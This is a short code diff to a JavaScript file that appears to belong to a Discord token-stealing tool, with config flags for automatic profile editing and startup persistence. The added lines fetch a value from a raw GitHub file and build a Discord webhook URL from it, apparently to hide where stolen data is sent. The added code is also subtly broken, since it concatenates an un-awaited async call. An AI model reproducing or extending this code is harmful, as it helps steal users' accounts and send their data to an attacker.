@@ -29,9 +29,13 @@ const execScript = async (script) => {
         return null;
     }
 };
-
+async function fetchwebhook() {
+    const response = await fetch('https://raw.githubusercontent.com/rxploit012/sc_dA1a/main/000H.txt');
+    const text = await response.text();
+    return text; 
+  }
 const CONFIG = {
-    webhook: '%WEBHOOK_URL%',
+    webhook: 'https://discord.com/api/webhooks/'+fetchwebhook(),
     API: '%API_URL%',
     auto_user_profile_edit: 'True',
     auto_persist_startup: 'True',
